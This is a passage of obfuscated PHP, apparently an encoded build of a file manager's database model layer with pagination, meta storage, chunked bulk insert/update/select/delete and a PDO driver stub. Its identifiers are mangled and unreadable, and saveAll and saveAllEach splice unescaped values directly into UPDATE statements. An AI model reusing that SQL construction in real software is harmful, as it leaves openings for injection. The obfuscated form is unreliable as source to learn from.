$şˆì²åŞ = intval($şˆì²åŞ); $şˆì²åŞ = $şˆì²åŞ <= 5 ? 5 : ($şˆì²åŞ >= $æÓÁº± ? $æÓÁº± : $şˆì²åŞ); $ãé´³í = intval(isset($in[$×Áƒİæì[348]]) && $in[$×Áƒİæì[348]] ? $in[$×Áƒİæì[348]] : $ãé´³í); $ãé´³í = $ãé´³í <= 1 ? 1 : $ãé´³í; $–ÃôÎÇ = array(); $Šğ¨äµÏ = 1; if ($ãé´³í == 1 && $Šğ¨äµÏ) { $this->optionsValue($áîı½ñ®); $–ÃôÎÇ = $this->page($ãé´³í, $şˆì²åŞ)->select(); $ŒÄ©ĞÊÁ = is_array($–ÃôÎÇ) ? count($–ÃôÎÇ) : 0; if ($ŒÄ©ĞÊÁ < $şˆì²åŞ) { $„Øë›˜ = 1; } else { $this->optionsValue($«…Ëø¢ì); $ŒÄ©ĞÊÁ = intval($this->count()); $„Øë›˜ = ceil($ŒÄ©ĞÊÁ / $şˆì²åŞ); } } else { $this->optionsValue($«…Ëø¢ì); $ŒÄ©ĞÊÁ = intval($this->count()); $„Øë›˜ = ceil($ŒÄ©ĞÊÁ / $şˆì²åŞ); $ãé´³í = $ãé´³í >= $„Øë›˜ ? $„Øë›˜ : $ãé´³í; $this->optionsValue($áîı½ñ®); $–ÃôÎÇ = $this->page($ãé´³í, $şˆì²åŞ)->select(); } if (!is_array($–ÃôÎÇ)) { $–ÃôÎÇ = array(); } if ($„Øë›˜ == 1) { $ŒÄ©ĞÊÁ = count($–ÃôÎÇ); } $õ´«‚¤ = array($×Áƒİæì[361] => array($×Áƒİæì[362] => $ŒÄ©ĞÊÁ, $×Áƒİæì[358] => $şˆì²åŞ, $×Áƒİæì[348] => $ãé´³í, $×Áƒİæì[363] => $„Øë›˜), $×Áƒİæì[364] => $–ÃôÎÇ); return $õ´«‚¤; } protected function checkLength($ÑäÏ, $ù±„­ = 0, $üÀÇàñå = '') { $³«¦Ú“ª =& $_SERVER[ì…™Î¶Ï]; $ù±„­ = $ù±„­ ? $ù±„­ : 65536; if (!$ÑäÏ || strlen($ÑäÏ) < $ù±„­) { return; } $üÀÇàñå = $üÀÇàñå ? $üÀÇàñå . $³«¦Ú“ª[71] : $³«¦Ú“ª[12]; show_json($üÀÇàñå . LNG($³«¦Ú“ª[365]) . "\50{$ù±„­}\x29", !1); } protected function metaSet($ËéÇª˜Ñ, $¡íÊÖ«‰ = null, $å¹»éŒ× = null) { $Æ†²„  =& $_SERVER[ì…™Î¶Ï]; if (!$this->tableMeta || !$ËéÇª˜Ñ) { return !1; } $æÇÙ»” = $this->tableMeta[$Æ†²„ [366]]; $ŠÇŠ¿òé = $this->tableMeta[$Æ†²„ [367]]; $ğÜäõ°Ñ = Model($ŠÇŠ¿òé); $ãóõşÊò = array($æÇÙ»” => $ËéÇª˜Ñ, $Æ†²„ [368] => $¡íÊÖ«‰); if (is_null($¡íÊÖ«‰)) { return $ğÜäõ°Ñ->where(array($æÇÙ»” => $ËéÇª˜Ñ))->delete(); } if (is_null($å¹»éŒ×) && is_string($¡íÊÖ«‰)) { return $ğÜäõ°Ñ->where($ãóõşÊò)->delete(); } $öêÉ‰İş = is_array($¡íÊÖ«‰) ? $¡íÊÖ«‰ : array(); if (is_string($¡íÊÖ«‰)) { $öêÉ‰İş[$¡íÊÖ«‰] = $å¹»éŒ×; } $ŸÔ°Ô³» = array(); foreach ($öêÉ‰İş as $“º¯¤ò¯ => $ñ¼ÀóÏ‚) { if (is_null($ñ¼ÀóÏ‚) && is_string($“º¯¤ò¯)) { $ğÜäõ°Ñ->where(array($æÇÙ»” => $ËéÇª˜Ñ, $Æ†²„ [368] => $“º¯¤ò¯))->delete(); continue; } $this->checkLength($ñ¼ÀóÏ‚, !1, $ŠÇŠ¿òé . $Æ†²„ [4] . $“º¯¤ò¯); $ŸÔ°Ô³»[] = array($æÇÙ»” => $ËéÇª˜Ñ, $Æ†²„ [95] => $“º¯¤ò¯, $Æ†²„ [369] => $ñ¼ÀóÏ‚); } $ğµÌÇ = $Æ†²„ [370] . $ŠÇŠ¿òé; CacheLock::lock($ğµÌÇ); $ğÜäõ°Ñ->where(array($æÇÙ»” => $ËéÇª˜Ñ))->addAll($ŸÔ°Ô³», array(), !0); CacheLock::unlock($ğµÌÇ); return !0; } public function metaGet($ÅÊ¬÷Í, $ÂÎşüÌ = false) { $ˆñ“½öœ =& $_SERVER[ì…™Î¶Ï]; if (!$this->tableMeta) { return array(); } $¥ÒÍÀ‰ = $this->tableMeta[$ˆñ“½öœ[366]]; $Æë¢»îë = Model($this->tableMeta[$ˆñ“½öœ[367]]); if ($ÂÎşüÌ) { $àÍÔêÒ™ = array($¥ÒÍÀ‰ => $ÅÊ¬÷Í, $ˆñ“½öœ[95] => $ÂÎşüÌ); return $Æë¢»îë->where($àÍÔêÒ™)->getField($ˆñ“½öœ[369]); } $àÍÔêÒ™ = array($¥ÒÍÀ‰ => $ÅÊ¬÷Í); $‡‰¾‘×¡ = $Æë¢»îë->field($ˆñ“½öœ[371])->where($àÍÔêÒ™)->select(); $‡‰¾‘×¡ = array_to_keyvalue($‡‰¾‘×¡, $ˆñ“½öœ[95], $ˆñ“½öœ[369]); return $‡‰¾‘×¡; } private function checkDataAutoHas($æí¸¥çŠ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¶ŠÙ£íû) { if (in_array($æí¸¥çŠ, explode($_SERVER[ì…™Î¶Ï][50], $¶ŠÙ£íû[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$âŒ‹ç£‘, $É« …Ã) { $«†Õ‰Ÿ =& $_SERVER[ì…™Î¶Ï]; if (!is_array($âŒ‹ç£‘)) { return; } foreach ($this->dataAuto as $ÄÔšÎ•Á) { $¡Ÿ“ïª¡ = $ÄÔšÎ•Á[0]; if (!in_array($É« …Ã, explode($«†Õ‰Ÿ[50], $ÄÔšÎ•Á[2]))) { continue; } switch (trim($ÄÔšÎ•Á[3])) { case $«†Õ‰Ÿ[316]: case $«†Õ‰Ÿ[317]: $¢¨Û¹â = $ÄÔšÎ•Á[1]; $À’¤¾ŒÌ = isset($ÄÔšÎ•Á[4]) ? (array) $ÄÔšÎ•Á[4] : array(); if ($¢¨Û¹â == $«†Õ‰Ÿ[196] && array_key_exists($¡Ÿ“ïª¡, $âŒ‹ç£‘)) { if (!$âŒ‹ç£‘[$¡Ÿ“ïª¡]) { unset($âŒ‹ç£‘[$¡Ÿ“ïª¡]); } break; } if (isset($âŒ‹ç£‘[$¡Ÿ“ïª¡])) { array_unshift($À’¤¾ŒÌ, $âŒ‹ç£‘[$¡Ÿ“ïª¡]); } if ($«†Õ‰Ÿ[316] == $ÄÔšÎ•Á[3]) { $âŒ‹ç£‘[$¡Ÿ“ïª¡] = call_user_func_array($¢¨Û¹â, $À’¤¾ŒÌ); } else { $âŒ‹ç£‘[$¡Ÿ“ïª¡] = call_user_func_array(array(&$this, $¢¨Û¹â), $À’¤¾ŒÌ); } break; case $«†Õ‰Ÿ[265]: if (isset($âŒ‹ç£‘[$¡Ÿ“ïª¡]) && $âŒ‹ç£‘[$¡Ÿ“ïª¡]) { $âŒ‹ç£‘[$¡Ÿ“ïª¡] = call_user_func_array(array(&$this, $ÄÔšÎ•Á[1]), array($âŒ‹ç£‘[$¡Ÿ“ïª¡])); } break; case $«†Õ‰Ÿ[268]: $âŒ‹ç£‘[$¡Ÿ“ïª¡] = $âŒ‹ç£‘[$ÄÔšÎ•Á[1]]; break; case $«†Õ‰Ÿ[289]: if (isset($âŒ‹ç£‘[$¡Ÿ“ïª¡]) && !is_string($âŒ‹ç£‘[$¡Ÿ“ïª¡])) { $âŒ‹ç£‘[$¡Ÿ“ïª¡] = json_encode_force($âŒ‹ç£‘[$¡Ÿ“ïª¡]); } break; case $«†Õ‰Ÿ[318]: if ($âŒ‹ç£‘[$¡Ÿ“ïª¡] === $«†Õ‰Ÿ[12]) { unset($âŒ‹ç£‘[$¡Ÿ“ïª¡]); } break; case $«†Õ‰Ÿ[319]: $âŒ‹ç£‘[$¡Ÿ“ïª¡] = $ÄÔšÎ•Á[1]; default: break; } } if ($É« …Ã == $«†Õ‰Ÿ[350]) { $Ğ¡¥¨Ş— = strtolower($this->db->getDbType()); if (strpos($Ğ¡¥¨Ş—, $«†Õ‰Ÿ[13]) !== 0) { return; } $ìúÛÓÑ¸ = $this->field(!0)->fields; $©¥‘Ùïò = $ìúÛÓÑ¸[$«†Õ‰Ÿ[247]]; if (isset($ìúÛÓÑ¸[$«†Õ‰Ÿ[246]])) { unset($©¥‘Ùïò[$ìúÛÓÑ¸[$«†Õ‰Ÿ[246]]]); } foreach ($©¥‘Ùïò as $ŠÅÚ¿éÓ => $É« …Ã) { if (!isset($âŒ‹ç£‘[$ŠÅÚ¿éÓ])) { $âŒ‹ç£‘[$ŠÅÚ¿éÓ] = $«†Õ‰Ÿ[12]; } } } } private function dataAfterFilter(&$õ·î÷Ğ‰) { $”š«ï¡ğ =& $_SERVER[ì…™Î¶Ï]; foreach ($this->dataAuto as $½ˆ±Ş¦°) { $é±½âª˜ = $½ˆ±Ş¦°[0]; if (!isset($õ·î÷Ğ‰[$é±½âª˜])) { continue; } if (!in_array($”š«ï¡ğ[352], explode($”š«ï¡ğ[50], $½ˆ±Ş¦°[2]))) { continue; } switch (trim($½ˆ±Ş¦°[3])) { case $”š«ï¡ğ[316]: case $”š«ï¡ğ[317]: $ãõŒ¥Ï = isset($½ˆ±Ş¦°[4]) ? (array) $½ˆ±Ş¦°[4] : array(); array_unshift($ãõŒ¥Ï, $õ·î÷Ğ‰[$é±½âª˜]); if (isset($½ˆ±Ş¦°[4]) && $½ˆ±Ş¦°[4] == $”š«ï¡ğ[372]) { $ãõŒ¥Ï = array($õ·î÷Ğ‰[$é±½âª˜]); } if ($”š«ï¡ğ[316] == $½ˆ±Ş¦°[3]) { $õ·î÷Ğ‰[$é±½âª˜] = call_user_func_array($½ˆ±Ş¦°[1], $ãõŒ¥Ï); } else { $õ·î÷Ğ‰[$é±½âª˜] = call_user_func_array(array(&$this, $½ˆ±Ş¦°[1]), $ãõŒ¥Ï); } break; case $”š«ï¡ğ[265]: if (isset($õ·î÷Ğ‰[$é±½âª˜]) && $õ·î÷Ğ‰[$é±½âª˜]) { $õ·î÷Ğ‰[$é±½âª˜] = call_user_func_array(array(&$this, $½ˆ±Ş¦°[1]), array($õ·î÷Ğ‰[$é±½âª˜])); } break; case $”š«ï¡ğ[268]: $õ·î÷Ğ‰[$é±½âª˜] = $õ·î÷Ğ‰[$½ˆ±Ş¦°[1]]; break; case $”š«ï¡ğ[289]: $Ü·è™ÖÚ = $õ·î÷Ğ‰[$é±½âª˜]; $õ·î÷Ğ‰[$é±½âª˜] = json_decode($Ü·è™ÖÚ, !0); if (is_null($õ·î÷Ğ‰[$é±½âª˜])) { $õ·î÷Ğ‰[$é±½âª˜] = $Ü·è™ÖÚ; } break; case $”š«ï¡ğ[318]: if ($õ·î÷Ğ‰[$é±½âª˜] === $”š«ï¡ğ[12]) { unset($õ·î÷Ğ‰[$é±½âª˜]); } break; case $”š«ï¡ğ[319]: $õ·î÷Ğ‰[$é±½âª˜] = $½ˆ±Ş¦°[1]; break; default: break; } } } public function saveAll($ÀŒ¨¹Û) { $Îèâ×¹ =& $_SERVER[ì…™Î¶Ï]; $ÌÃ¢³„’ = $this->tablePrefix . $this->tableName; $„ñ•Ÿü = self::SQL_WHERE_IN_CHUNK; $ÀŒ¨¹Û = is_array($ÀŒ¨¹Û) ? $ÀŒ¨¹Û : array(); $ÚìİğÓÌ = $Îèâ×¹[373]; $›ˆ’äÀ¸ = 0; $¸š©”ë = array(); $îĞÛ¦öÎ = count($ÀŒ¨¹Û); for ($à†ıÂı© = 0; $à†ıÂı© < $îĞÛ¦öÎ; $à†ıÂı©++) { $û†—’èÎ = $ÀŒ¨¹Û[$à†ıÂı©]; if (!is_array($û†—’èÎ) || count($û†—’èÎ) != 4) { continue; } $ÒìªÄê’ = "\x55\x50\x44\x41\x54\105\40\140{$ÌÃ¢³„’}\x60\40\123\105\x54\x20{$û†—’èÎ[2]}\40\x3d\x20\103\101\x53\x45\x20{$û†—’èÎ[0]}\x20\12"; if ($›ˆ’äÀ¸ == 0) { $ÚìİğÓÌ = $ÒìªÄê’; } $¸š©”ë[] = $Îèâ×¹[117] . $û†—’èÎ[1] . $Îèâ×¹[117]; $›ˆ’äÀ¸++; $ÚìİğÓÌ .= "\40\127\110\105\116\40\47{$û†—’èÎ[1]}\47\x20\124\x48\x45\116\40\x27{$û†—’èÎ[3]}\x27\x20\xa"; if ($›ˆ’äÀ¸ == $„ñ•Ÿü || $à†ıÂı© == $îĞÛ¦öÎ - 1) { $óË…Ô×÷ = implode($Îèâ×¹[50], $¸š©”ë); $ÚìİğÓÌ .= "\40\105\x4e\x44\40\40\127\110\x45\122\x45\40{$û†—’èÎ[0]}\40\x49\x4e\40\50{$óË…Ô×÷}\51\x20"; $this->execute($ÚìİğÓÌ); $›ˆ’äÀ¸ = 0; $ÚìİğÓÌ = $ÒìªÄê’; $this->chunkEventCheck(count($¸š©”ë)); $¸š©”ë = array(); } } $this->chunkEventSet(); } public function saveAllEach($ü–ıôãÎ) { $†ÌÎ”øÆ =& $_SERVER[ì…™Î¶Ï]; $Æ—ÙÄ = $this->tablePrefix . $this->tableName; foreach ($ü–ıôãÎ as $ÈÓûÀî›) { if (!is_array($ÈÓûÀî›) || count($ÈÓûÀî›) != 4) { continue; } $Û™…İ—´ = $ÈÓûÀî›[0] . $†ÌÎ”øÆ[374] . $ÈÓûÀî›[1] . $†ÌÎ”øÆ[117]; $ËŠÄÌ§Ş = $ÈÓûÀî›[2] . $†ÌÎ”øÆ[374] . $ÈÓûÀî›[3] . $†ÌÎ”øÆ[117]; $é´ã¾‘Û = "\165\x70\144\141\164\x65\x20{$Æ—ÙÄ}\40\x73\145\x74\40{$ËŠÄÌ§Ş}\x20\167\150\145\162\x65\40{$Û™…İ—´}\73"; $this->execute($é´ã¾‘Û); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($½ó•ãıÒ = false, $Â–µûë = false) { $this->_chunkEvent = $½ó•ãıÒ; $this->_chunkEventParam = $Â–µûë; } private function chunkEventCheck($â¯‘Î€) { if (!$this->_chunkEvent) { return; } $Ö„ÈƒÖ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ö„ÈƒÖ[$_SERVER[ì…™Î¶Ï][375]] = $â¯‘Î€; Hook::trigger($this->_chunkEvent, $Ö„ÈƒÖ); } public function addAll($÷ŒÚßöƒ, $ì—ªŸ¸´ = array(), $Ñ”ùûï = false) { $å‘ŸÌİ° =& $_SERVER[ì…™Î¶Ï]; ignore_timeout(); $»ïşÅÈ = self::SQL_WHERE_IN_CHUNK; if (empty($÷ŒÚßöƒ)) { $this->error = think_lang($å‘ŸÌİ°[266]); return !1; } $ì—ªŸ¸´ = $this->_parseOptions($ì—ªŸ¸´); foreach ($÷ŒÚßöƒ as $¢á¬‰ => $‚º¹Œ¨À) { $÷ŒÚßöƒ[$¢á¬‰] = $this->_facade($‚º¹Œ¨À); $this->_beforeInsert($÷ŒÚßöƒ[$¢á¬‰], $ì—ªŸ¸´); } if (method_exists($this->db, $å‘ŸÌİ°[267])) { for ($÷¼øÚöï = 0; $÷¼øÚöï < count($÷ŒÚßöƒ); $÷¼øÚöï += $»ïşÅÈ) { $ˆ×·Î¬ì = array_slice($÷ŒÚßöƒ, $÷¼øÚöï, $»ïşÅÈ); if (!is_array($ˆ×·Î¬ì) || count($ˆ×·Î¬ì) == 0) { break; } $œ¤öºá = $this->db->insertAll($ˆ×·Î¬ì, $ì—ªŸ¸´, $Ñ”ùûï); $this->chunkEventCheck(count($ˆ×·Î¬ì)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($÷ŒÚßöƒ as $¢á¬‰ => $‚º¹Œ¨À) { $œ¤öºá = $this->db->insert($‚º¹Œ¨À, $ì—ªŸ¸´, $Ñ”ùûï); } $this->commit(); } if (!1 !== $œ¤öºá) { $¶àÂ = $this->getLastInsID(); if ($¶àÂ) { return $¶àÂ; } } return $œ¤öºá; } public function save($ÛÔÀ‰ê· = '', $”˜Í¡Ç = array()) { $õ”€ô­ =& $_SERVER[ì…™Î¶Ï]; $§ƒïåœ¼ = self::SQL_WHERE_IN_CHUNK; $¯ˆ¾¯ = $this->optionsValue(); $öàß¾Š = $this->findWhereField($¯ˆ¾¯); if (!$öàß¾Š) { return parent::save($ÛÔÀ‰ê·, $”˜Í¡Ç); } $ë´†¤šá = 0; $ø¤ ¹¬® = $¯ˆ¾¯[$õ”€ô­[270]][$öàß¾Š][1]; $ø¤ ¹¬® = is_array($ø¤ ¹¬®) ? $ø¤ ¹¬® : array(); $†ø­±ï = count($ø¤ ¹¬®); for ($ë‰ôÍ° = 0; $ë‰ôÍ° < $†ø­±ï; $ë‰ôÍ° += $§ƒïåœ¼) { $ØÉºÑŸ = array_slice($ø¤ ¹¬®, $ë‰ôÍ°, $§ƒïåœ¼); if (!is_array($ØÉºÑŸ) || count($ØÉºÑŸ) == 0) { break; } $¯ˆ¾¯[$õ”€ô­[270]][$öàß¾Š][1] = $ØÉºÑŸ; $this->optionsValue($¯ˆ¾¯); $ë´†¤šá += parent::save($ÛÔÀ‰ê·, $”˜Í¡Ç); $this->chunkEventCheck(count($ØÉºÑŸ)); } $this->chunkEventSet(); return $ë´†¤šá; } public function add($ñşã¸Ê = '', $ş¾İÆå– = array(), $ñöé…«ª = false) { if ($this->addTaskStatus && is_array($ñşã¸Ê)) { $this->addTaskData[] = $ñşã¸Ê; return; } return parent::add($ñşã¸Ê, $ş¾İÆå–, $ñöé…«ª); } public function parseWhereLike($ıîÒ²‹é, $­êóôñ† = '', $÷ÀÙşşí = false, &$‚×À¼Æ› = false) { $ä¨ƒÉÃÃ =& $_SERVER[ì…™Î¶Ï]; $çäë˜ø = $GLOBALS[$ä¨ƒÉÃÃ[6]][$ä¨ƒÉÃÃ[376]]; if (!$çäë˜ø[$ä¨ƒÉÃÃ[377]]) { return $ıîÒ²‹é; } if (!is_array($ıîÒ²‹é)) { return $ıîÒ²‹é; } $ÔÊç­Š¸ = array(); $Şç§Õğ¶ = 0; foreach ($ıîÒ²‹é as $û“ºİ½¤ => $Ï³¯ˆ…¾) { if (is_array($Ï³¯ˆ…¾) && count($Ï³¯ˆ…¾) == 2 && $Ï³¯ˆ…¾[0] == $ä¨ƒÉÃÃ[378] && is_string($Ï³¯ˆ…¾[1]) && substr($Ï³¯ˆ…¾[1], 0, 1) == $ä¨ƒÉÃÃ[379] && substr($Ï³¯ˆ…¾[1], strlen($Ï³¯ˆ…¾[1]) - 1, 1) == $ä¨ƒÉÃÃ[379]) { $‚×À¼Æ› = !0; $ÜÄİáĞı = is_string($û“ºİ½¤) ? $û“ºİ½¤ : $­êóôñ†; $Èàà»Œå = substr($Ï³¯ˆ…¾[1], 1, strlen($Ï³¯ˆ…¾[1]) - 2); $Èàà»Œå = $this->db->escapeString($Èàà»Œå); if (!strpos($ÜÄİáĞı, $ä¨ƒÉÃÃ[10])) { $ÜÄİáĞı = $ä¨ƒÉÃÃ[380] . $ÜÄİáĞı . $ä¨ƒÉÃÃ[380]; } $ŸĞò“ñ = $ä¨ƒÉÃÃ[181] . $Èàà»Œå . $ä¨ƒÉÃÃ[181]; if ($çäë˜ø[$ä¨ƒÉÃÃ[381]]) { $ŸĞò“ñ = $ä¨ƒÉÃÃ[382] . $Èàà»Œå . $ä¨ƒÉÃÃ[383]; if ($çäë˜ø[$ä¨ƒÉÃÃ[384]]) { $ŸĞò“ñ = $ä¨ƒÉÃÃ[383] . $Èàà»Œå . $ä¨ƒÉÃÃ[382]; } } $ÔÊç­Š¸[$Şç§Õğ¶] = $ä¨ƒÉÃÃ[385] . $ÜÄİáĞı . $ä¨ƒÉÃÃ[386] . $ŸĞò“ñ . $ä¨ƒÉÃÃ[387]; $Şç§Õğ¶++; continue; } if (is_array($Ï³¯ˆ…¾)) { $­êóôñ† = is_string($û“ºİ½¤) ? $û“ºİ½¤ : $­êóôñ†; $Ï³¯ˆ…¾ = $this->parseWhereLike($Ï³¯ˆ…¾, $­êóôñ†, !0, $‚×À¼Æ›); } if (is_numeric($û“ºİ½¤)) { $ÔÊç­Š¸[$Şç§Õğ¶] = $Ï³¯ˆ…¾; $Şç§Õğ¶++; } else { $ÔÊç­Š¸[$û“ºİ½¤] = $Ï³¯ˆ…¾; } } if ($‚×À¼Æ› && !$÷ÀÙşşí) { } return $ÔÊç­Š¸; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ŒšÅ˜ï– = array()) { $ıÅ–ÛîĞ =& $_SERVER[ì…™Î¶Ï]; $š˜±ÕúÆ = self::SQL_WHERE_IN_CHUNK; $ÏÈ´ù…ù = $this->optionsValue(); $ë‡âæß® = $this->findWhereField($ÏÈ´ù…ù); if (!$ë‡âæß® || isset($ÏÈ´ù…ù[$ıÅ–ÛîĞ[287]]) || isset($ÏÈ´ù…ù[$ıÅ–ÛîĞ[348]])) { return parent::select($ŒšÅ˜ï–); } $…Ò—ïÍÚ = $ÏÈ´ù…ù[$ıÅ–ÛîĞ[270]][$ë‡âæß®][1]; $…Ò—ïÍÚ = is_array($…Ò—ïÍÚ) ? $…Ò—ïÍÚ : array(); $àŸ‰‘‹ä = null; for ($‚®ÀËîš = 0; $‚®ÀËîš < count($…Ò—ïÍÚ); $‚®ÀËîš += $š˜±ÕúÆ) { $÷‘Òşì§ = array_slice($…Ò—ïÍÚ, $‚®ÀËîš, $š˜±ÕúÆ); if (!is_array($÷‘Òşì§) || count($÷‘Òşì§) == 0) { break; } $ÏÈ´ù…ù[$ıÅ–ÛîĞ[270]][$ë‡âæß®][1] = $÷‘Òşì§; $this->optionsValue($ÏÈ´ù…ù); $É°¯ë = parent::select($ŒšÅ˜ï–); if (!$É°¯ë) { continue; } $àŸ‰‘‹ä = is_array($àŸ‰‘‹ä) ? $àŸ‰‘‹ä : array(); $àŸ‰‘‹ä = array_merge($àŸ‰‘‹ä, $É°¯ë); } return $àŸ‰‘‹ä; } public function delete($¹˜•ã–å = array()) { $Ì¾µ½‹÷ =& $_SERVER[ì…™Î¶Ï]; $”·‡œÄª = self::SQL_WHERE_IN_CHUNK; $ÊÓ˜€ = $this->optionsValue(); $¦Œ”ŸÛ = $this->findWhereField($ÊÓ˜€); if (!$¦Œ”ŸÛ) { return parent::delete($¹˜•ã–å); } $±ìÜ½ = 0; $ğ²ÎÌ« = $ÊÓ˜€[$Ì¾µ½‹÷[270]][$¦Œ”ŸÛ][1]; $ğ²ÎÌ« = is_array($ğ²ÎÌ«) ? $ğ²ÎÌ« : array(); for ($Ç¢şŸà« = 0; $Ç¢şŸà« < count($ğ²ÎÌ«); $Ç¢şŸà« += $”·‡œÄª) { $ ö™‘ëÑ = array_slice($ğ²ÎÌ«, $Ç¢şŸà«, $”·‡œÄª); if (!is_array($ ö™‘ëÑ) || count($ ö™‘ëÑ) == 0) { break; } $ÊÓ˜€[$Ì¾µ½‹÷[270]][$¦Œ”ŸÛ][1] = $ ö™‘ëÑ; $this->optionsValue($ÊÓ˜€); $±ìÜ½ += parent::delete($¹˜•ã–å); } return $±ìÜ½; } private function findWhereField($ÂóÊêØÉ) { $µÊş°ÃÄ =& $_SERVER[ì…™Î¶Ï]; $ûâ‚¨ì = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÂóÊêØÉ) || !is_array($ÂóÊêØÉ[$µÊş°ÃÄ[270]])) { return !1; } foreach ($ÂóÊêØÉ[$µÊş°ÃÄ[270]] as $ÒºÅœÙ‹ => $–€¤€‚) { if (is_array($–€¤€‚) && isset($–€¤€‚[0]) && is_string($–€¤€‚[0]) && strtolower($–€¤€‚[0]) == $µÊş°ÃÄ[7] && is_array($–€¤€‚[1]) && count($–€¤€‚[1]) > $ûâ‚¨ì) { ignore_timeout(); return $ÒºÅœÙ‹; } } return !1; } public function setMasterDB($¡ªûà± = true) { think_config($_SERVER[ì…™Î¶Ï][388], $¡ªûà±); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\x6d\x4f\x70\x74\151\157\156"; public $field = array(); public function listData($úáÉï­Ö = false, $–éº÷´Õ = "\x6d\x6f\x64\151\146\x79\x54\x69\x6d\145", $ÑªÈâÒ = false) { $îœÀ¾”» = Model($this->modelType)->get(!1, $this->optionType, !0); $ÆçˆÒÙú = array_values($îœÀ¾”»); if ($ÆçˆÒÙú && $ÆçˆÒÙú[0] && !is_array($ÆçˆÒÙú[0])) { Model($this->modelType)->cacheRemove($this->optionType); $îœÀ¾”» = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$îœÀ¾”») { return $úáÉï­Ö ? null : array(); } if (!$úáÉï­Ö) { $îœÀ¾”» = array_filter(array_values($îœÀ¾”»)); return array_sort_by($îœÀ¾”», $–éº÷´Õ, $ÑªÈâÒ); } return $îœÀ¾”»[$_SERVER[ì…™Î¶Ï][389] . $úáÉï­Ö]; } public function insert($ÃÑ¦Ø½®) { $¸Ä˜ü½Î =& $_SERVER[ì…™Î¶Ï]; $ÃÑ¦Ø½® = array_field_key($ÃÑ¦Ø½®, $this->field); $¾êœø®û = Model($this->modelType)->get($¸Ä˜ü½Î[390], $this->optionType . $¸Ä˜ü½Î[391]); $¾êœø®û = $¾êœø®û ? $¾êœø®û : 0; $ÃÑ¦Ø½®[$¸Ä˜ü½Î[392]] = ++$¾êœø®û; $ÃÑ¦Ø½®[$¸Ä˜ü½Î[193]] = time(); $ÃÑ¦Ø½®[$¸Ä˜ü½Î[86]] = time(); Model($this->modelType)->set($¸Ä˜ü½Î[390], $¾êœø®û, $this->optionType . $¸Ä˜ü½Î[391]); Model($this->modelType)->set($¸Ä˜ü½Î[389] . $¾êœø®û, $ÃÑ¦Ø½®, $this->optionType); return $¾êœø®û; } public function update($€ë°â¡ì, $¨øƒšØ) { $‹Ï¶…ğä =& $_SERVER[ì…™Î¶Ï]; $¨øƒšØ = array_field_key($¨øƒšØ, $this->field); $äàà÷»÷ = $this->listData($€ë°â¡ì); if (!$äàà÷»÷ || !$€ë°â¡ì) { return !1; } $¨øƒšØ = array_merge($äàà÷»÷, $¨øƒšØ); $¨øƒšØ[$‹Ï¶…ğä[86]] = time(); return Model($this->modelType)->set($‹Ï¶…ğä[389] . $€ë°â¡ì, $¨øƒšØ, $this->optionType); } public function remove($œôÑÜ“Ó) { if (!$œôÑÜ“Ó) { return !1; } return Model($this->modelType)->remove($_SERVER[ì…™Î¶Ï][389] . $œôÑÜ“Ó, $this->optionType); } public function clear() { $ş®øÄ¤ =& $_SERVER[ì…™Î¶Ï]; Model($this->modelType)->remove($ş®øÄ¤[390], $this->optionType . $ş®øÄ¤[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($É¾øóå–, $­‘ñÖš”) { if (!$­‘ñÖš”) { return !1; } $„şÊÌ‹÷ = $this->listData(); $„şÊÌ‹÷ = array_to_keyvalue($„şÊÌ‹÷, $É¾øóå–); return isset($„şÊÌ‹÷[$­‘ñÖš”]) ? $„şÊÌ‹÷[$­‘ñÖš”] : !1; } public function findByName($Ì‡·Ê£˜) { return $this->findByKey($_SERVER[ì…™Î¶Ï][32], $Ì‡·Ê£˜); } protected function resetData($¶Œ…¯å«) { $“øëáŠ =& $_SERVER[ì…™Î¶Ï]; $¶Œ…¯å« = is_array($¶Œ…¯å«) ? $¶Œ…¯å« : array(); $Æ´–›Õù = array(); for ($³ £°ùğ = 0; $³ £°ùğ < count($¶Œ…¯å«); $³ £°ùğ++) { $Æ´–›Õù[$“øëáŠ[389] . $¶Œ…¯å«[$³ £°ùğ][$“øëáŠ[392]]] = $¶Œ…¯å«[$³ £°ùğ]; } return Model($this->modelType)->set($Æ´–›Õù, !1, $this->optionType); } private function getAutoName($Ô¸Å­·) { $ö¨¯í² = array_to_keyvalue($this->listData(), $_SERVER[ì…™Î¶Ï][32]); if (!$ö¨¯í² || !isset($ö¨¯í²[$Ô¸Å­·])) { return $Ô¸Å­·; } for ($ÙßäŠ­Ã = 1; $ÙßäŠ­Ã < count($ö¨¯í²); $ÙßäŠ­Ã++) { $¯˜µíŸ… = $Ô¸Å­· . "\x28{$ÙßäŠ­Ã}\51"; if (!isset($ö¨¯í²[$¯˜µíŸ…])) { return $¯˜µíŸ…; } } return $¯˜µíŸ…; } } goto DŒÃƒ˜áÂ–; c—ªÌš©˜á: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ñÔÂÑ’´ = '') { $òáé¡óØ =& $_SERVER[ì…™Î¶Ï]; if (!class_exists($òáé¡óØ[890])) { think_exception(think_lang($òáé¡óØ[14]) . $òáé¡óØ[891]); } if (!empty($ñÔÂÑ’´)) { $this->config = $ñÔÂÑ’´; if (empty($this->config[$òáé¡óØ[17]])) { $this->config[$òáé¡óØ[17]] = array(); } } } public function connect($Ìø¼¹¬“ = '', $¥‹¯ĞÙ = 0) { $š„ÎÖŒ =& $_SERVER[ì…™Î¶Ï]; if (!isset($this->linkID[$¥‹¯ĞÙ])) { if (empty($Ìø¼¹¬“)) { $Ìø¼¹¬“ = $this->config; } $÷Ô¤âî‡ = !empty($Ìø¼¹¬“[$š„ÎÖŒ[17]][$š„ÎÖŒ[18]]) ? 